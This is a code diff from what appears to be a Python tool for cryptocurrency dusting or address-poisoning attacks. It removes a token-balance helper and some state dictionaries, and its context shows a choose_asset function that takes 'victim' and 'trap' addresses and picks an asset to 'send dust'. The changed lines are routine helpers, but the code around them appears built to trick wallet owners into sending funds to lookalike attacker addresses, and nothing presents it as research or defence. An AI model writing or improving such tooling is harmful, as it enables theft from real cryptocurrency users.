@@ -445,18 +445,6 @@ def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
             else:
                 raise
     raise last_exc
-
-def get_token_balance(address, token_symbol):
-    token_addr = TOKEN_CONFIG.get(token_symbol)
-    if not token_addr:
-        return 0
-    token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
-    try:
-        balance = call_with_retry(token.functions.balanceOf, address).call()
-        return balance
-    except Exception as e:
-        logger.warning(f"Failed to get token balance for {address}: {e}")
-        return 0
     
 
 def choose_asset(victim, trap, preferred_asset=None, exact_amount=None, exact_asset=None):
@@ -665,8 +653,7 @@ def choose_asset(victim, trap, preferred_asset=None, exact_amount=None, exact_as
     error_msg = "❌ No suitable asset found to send dust.\nDetails:\n" + "\n".join([f"• {r}" for r in reasons])
     return (None, 0, error_msg)
 
-_last_low_balance_alert = {}
-_local_nonces = {}
+
 
 def get_native_reserve_wei(chain_name):
     """Calculates the Wei equivalent of the GAS_RESERVE_USD for the native coin."""
